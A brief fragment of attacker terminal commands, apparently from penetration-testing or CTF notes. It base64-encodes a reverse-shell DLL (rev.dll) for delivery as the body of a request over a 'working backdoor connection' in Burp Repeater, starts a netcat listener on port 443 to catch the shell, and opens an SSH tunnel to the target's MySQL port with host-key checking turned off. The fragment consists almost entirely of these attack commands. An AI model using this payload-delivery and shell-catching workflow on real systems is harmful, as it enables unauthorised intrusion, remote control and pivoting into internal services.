...
$ base64 -w0 rev.dll ; echo # paste the encoded file as the body of the working backdoor connection in Burp Repeater. (Ctrl-U to URL-encode characters in Burp).
$ rlwrap -cAr nc -lnvp 443
```
...
$ ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -fNL 127.0.0.1:43306:127.0.0.1:3306 user@target
